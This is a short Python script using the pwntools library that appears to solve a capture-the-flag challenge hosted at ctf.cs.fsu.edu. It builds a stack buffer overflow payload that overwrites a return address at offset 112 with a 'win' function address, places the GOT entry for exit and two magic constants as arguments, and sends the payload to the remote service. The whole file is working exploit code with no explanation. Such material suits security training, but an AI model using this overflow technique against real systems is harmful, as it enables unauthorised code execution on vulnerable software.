from pwn import * 

io = remote('ctf.cs.fsu.edu', 18880)
exe = context.binary = ELF('vuln')
#io = exe.process()
#gdb.attach(io)
winaddr = 0x8049296
exitaddr = exe.got['exit']
payload = fit({
    112: winaddr,
    116: exitaddr,
    120: 0xcafef00d,
    124: 0xf00df00d
})

io.recvuntil(b'Please enter your string: \n')

io.sendline(payload)
print(io.recvline())
print(io.recvline())